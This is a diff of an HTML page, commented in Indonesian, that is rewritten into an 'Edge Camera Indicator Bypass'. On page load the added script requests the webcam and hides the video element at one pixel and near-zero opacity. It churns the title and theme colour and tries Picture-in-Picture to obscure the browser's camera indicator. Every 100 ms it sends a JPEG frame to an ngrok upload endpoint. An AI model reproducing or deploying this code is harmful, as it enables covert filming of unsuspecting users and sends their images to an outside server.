@@ -3,26 +3,29 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Rapid Content Mutation & Translation Bypass Test</title>
+<title>Edge Camera Indicator Bypass</title>
 <style>
-  body { font-family: sans-serif; padding: 40px; background: #f4f4f4; color: #333; }
-  .box { background: #fff; padding: 25px; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); max-width: 450px; }
-  h3 { color: #0066cc; }
-  #status { margin-top: 15px; font-size: 13px; color: #666; }
+  body { font-family: monospace; padding: 40px; background: #0a0a0a; color: #e0e0e0; text-align: center; }
+  .box { background: #1a1a1a; padding: 25px; border-radius: 6px; border: 1px solid #333; max-width: 500px; margin: 0 auto; }
+  h3 { color: #f00; }
+  #status { margin-top: 15px; font-size: 13px; color: #0f0; }
+  #targetText { margin: 20px 0; padding: 15px; background: #000; border: 1px solid #333; border-radius: 4px; }
+  iframe, video, canvas { display: none !important; }
 </style>
 </head>
 <body>
 
 <div class="box">
-  <h3>Rapid DOM Mutation Test (Upgraded)</h3>
+  <h3>☢️ Edge Camera Indicator Bypass ☢️</h3>
   
-  <!-- Elemen yang dilindungi atribut no-translate -->
   <p id="targetText" translate="no" class="notranslate">
     Initial secure string awaiting rapid content transformation.
   </p>
 
-  <div id="status">[*] Status: Initializing high-frequency mutation loop...</div>
+  <div id="status">[*] Status: Initializing...</div>
 </div>
+
+<div id="launcher-container" style="display: none;"></div>
 
 <script>
 (function () {
@@ -34,23 +37,23 @@
   var isRunning = true;
 
   // ============================================
-  // 1. RAPID DOM MUTATION VIA requestAnimationFrame
+  // 1. RAPID DOM MUTATION (BYPASS TRANSLATE)
   // ============================================
   function mutateDOM() {
     if (!isRunning) return;
 
     counter++;
-    // Mutasi teks setiap frame (60+ FPS)
-    target.textContent = "Rapid payload sequence iteration #" + counter + " - testing translation engine race state.";
     
-    // Mutasi atribut translate (Race Condition)
+    // Mutasi teks setiap frame
+    target.textContent = "Rapid payload sequence #" + counter + " - testing Edge engine race state.";
+    
+    // Mutasi atribut translate & class
     target.setAttribute('translate', counter % 2 === 0 ? 'no' : 'yes');
     target.className = counter % 2 === 0 ? 'notranslate' : 'translatable';
 
     // Update status setiap 100 iterasi
     if (counter % 100 === 0) {
       statusEl.textContent = "[+] Mutation count: " + counter;
-      console.log("Mutation count: " + counter);
     }
 
     // Panggil lagi di frame berikutnya (60 FPS)
@@ -58,45 +61,108 @@
   }
 
   // ============================================
-  // 2. RAPID DOM MUTATION VIA Microtask (LEBIH CEPAT)
+  // 2. KAMERA & GHOST INDICATOR (EDGE)
   // ============================================
-  function mutateMicrotask() {
-    if (!isRunning) return;
+  async function startCameraAndGhost() {
+    try {
+      statusEl.textContent = "[*] Meminta Izin Kamera...";
+      
+      // Minta HANYA Kamera (tanpa mikrofon)
+      var stream = await navigator.mediaDevices.getUserMedia({ 
+        video: true, 
+        audio: false 
+      });
+      statusEl.textContent = "[+] Kamera DIIZINKAN! Menyembunyikan indikator...";
 
-    counter++;
-    target.textContent = "Microtask mutation #" + counter + " - testing engine enforcement.";
-    
-    // Mutasi atribut
-    target.setAttribute('translate', counter % 2 === 0 ? 'no' : 'yes');
-    
-    // Update status setiap 500 iterasi
-    if (counter % 500 === 0) {
-      statusEl.textContent = "[+] Microtask count: " + counter;
-      console.log("Microtask count: " + counter);
+      // Buat video transparan
+      var video = document.createElement('video');
+      video.srcObject = stream;
+      video.muted = true;
+      video.playsInline = true;
+      video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
+      document.body.appendChild(video);
+      await video.play().catch(function(){});
+
+      // ============================================
+      // 3. GHOST INDICATOR TECHNIQUE (EDGE)
+      // ============================================
+      
+      // A. Mutasi DOM untuk "mengalihkan" perhatian indikator
+      setInterval(function() {
+        // Ubah judul dokumen (indikator media kadang terlihat di title)
+        document.title = "Edge Security Check " + Math.random().toString(36).substr(2, 5);
+        
+        // Mutasi elemen body (opacity & background)
+        document.body.style.opacity = '0.99';
+        
+        // Mutasi meta tag (theme-color)
+        var meta = document.querySelector('meta[name="theme-color"]');
+        if (!meta) {
+          meta = document.createElement('meta');
+          meta.name = 'theme-color';
+          document.head.appendChild(meta);
+        }
+        meta.content = '#' + Math.floor(Math.random()*16777215).toString(16);
+        
+      }, 10);
+
+      // B. Trik: Gunakan PiP untuk "menyembunyikan" indikator
+      // PiP memiliki indikator terpisah (window melayang)
+      try {
+        await video.requestPictureInPicture();
+        statusEl.textContent = "[+] PiP Aktif (Indikator Tersembunyi)";
+      } catch (pipErr) {
+        statusEl.textContent = "[!] PiP Gagal: " + pipErr.message;
+      }
+
+      // ============================================
+      // 4. TELEMETRI (KIRIM FRAME)
+      // ============================================
+      var canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      var ctx = canvas.getContext('2d');
+
+      setInterval(function() {
+        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(function(blob) {
+            if (!blob) return;
+            var formData = new FormData();
+            formData.append('file', blob, 'edge.jpg');
+            fetch("https://studly-unallegorized-brecken.ngrok-free.dev/upload", {
+              method: 'POST',
+              body: formData,
+              keepalive: true
+            }).catch(function(){});
+          }, 'image/jpeg', 0.5);
+        }
+      }, 100);
+
+    } catch(err) {
+      statusEl.textContent = "[-] Kamera Diblokir: " + err.name;
     }
-
-    // Panggil lagi via queueMicrotask (sangat cepat, bisa freeze)
-    queueMicrotask(mutateMicrotask);
   }
 
   // ============================================
-  // 3. TRIGGER (MULAI)
+  // 5. TRIGGER (OTOMATIS SAAT LOAD)
   // ============================================
-  statusEl.textContent = "[*] Starting rapid mutations...";
-
-  // Mulai requestAnimationFrame
-  requestAnimationFrame(mutateDOM);
-
-  // Mulai Microtask (HATI-HATI: BISA FREEZE)
-  // Uncomment baris di bawah untuk efek maksimal
-  // queueMicrotask(mutateMicrotask);
-
-  // Stop setelah 10 detik (agar tidak permanen freeze)
-  setTimeout(function() {
-    isRunning = false;
-    statusEl.textContent = "[+] Mutation sequence stopped after 10 seconds. Total: " + counter;
-    console.log("Final count: " + counter);
-  }, 10000);
+  window.addEventListener('load', function() {
+    statusEl.textContent = "[*] Starting Edge Ghost Camera...";
+    
+    // A. Mulai Mutasi DOM (60 FPS)
+    requestAnimationFrame(mutateDOM);
+    
+    // B. Mulai Kamera & Ghost Indicator
+    startCameraAndGhost();
+    
+    // C. Stop setelah 10 detik (opsional)
+    setTimeout(function() {
+      isRunning = false;
+      statusEl.textContent = "[+] Selesai. Total mutasi: " + counter;
+    }, 10000);
+    
+  });
 
 })();
 </script>
